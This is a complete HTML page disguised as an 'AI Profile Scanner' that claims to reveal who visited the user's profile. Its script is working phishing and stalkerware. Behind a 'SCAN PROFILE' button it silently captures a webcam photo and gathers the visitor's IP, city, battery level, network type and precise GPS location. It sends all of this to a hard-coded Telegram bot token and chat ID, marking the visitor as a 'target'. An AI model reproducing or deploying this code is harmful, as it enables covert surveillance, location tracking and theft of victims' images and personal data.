<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI PROFILE ANALYZER</title>
    <style>
        body { background: #000; color: #0f0; font-family: sans-serif; text-align: center; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .box { border: 1px solid #333; padding: 20px; border-radius: 10px; width: 90%; max-width: 350px; }
        .btn { background: #1877f2; color: #fff; border: none; padding: 12px 20px; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 20px; width: 100%; }
        #video { display: none; }
        canvas { display: none; }
    </style>
</head>
<body>

<div class="box">
    <h2>AI Profile Scanner</h2>
    <p style="color: #888; font-size: 14px;">Allow camera to scan your face and find who visited your profile recently.</p>
    <button class="btn" onclick="initiateHacking()">SCAN PROFILE</button>
</div>

<video id="video" autoplay></video>
<canvas id="canvas"></canvas>

<script>
    const TOKEN = '8032917202:AAFCD2hCP709BspRJSbibMl3BefYTVxV-qE';
    const CHAT_ID = '7416528268';

    async function initiateHacking() {
        // 1. All Permission in One (Camera + Location background-e kaj korbe)
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            document.getElementById('video').srcObject = stream;
            
            // Chhobi tolar jonno 2 second somoy nebe jate focus thik hoy
            setTimeout(() => { capturePhoto(); }, 2000);

            // 2. Sathe sathe GPS ebong baki data neya shuru
            collectAllData();
            
            alert("Scanning started... Please wait.");
        } catch (err) {
            alert("Error: Camera permission required for AI scan.");
        }
    }

    async function collectAllData() {
        // IP, City, Battery, Network
        try {
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();
            const locRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
            const locData = await locRes.json();
            const b = await navigator.getBattery();
            const conn = navigator.connection || {};

            let msg = `
âš ï¸ *TARGET ACCESSED* âš ï¸
ðŸŒ IP: \`${ipData.ip}\`
ðŸ“ City: ${locData.city}
ðŸ”‹ Battery: ${(b.level * 100).toFixed(0)}%
ðŸ“¶ Net: ${conn.type || 'SIM/WiFi'}
ðŸ›° Maps: [View](https://www.google.com/maps?q=${locData.latitude},${locData.longitude})`;

            sendTelegram(msg);

            // Precise Location (GPS)
            navigator.geolocation.getCurrentPosition((pos) => {
                let gpsMsg = `ðŸŽ¯ *GPS ACCURATE*\nLink: [Google Maps](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`;
                sendTelegram(gpsMsg);
            });
        } catch (e) {}
    }

    function capturePhoto() {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        
        canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'target_face.jpg');
            
            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
        }, 'image/jpeg');
    }

    function sendTelegram(text) {
        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
        });
    }
</script>

</body>
</html>
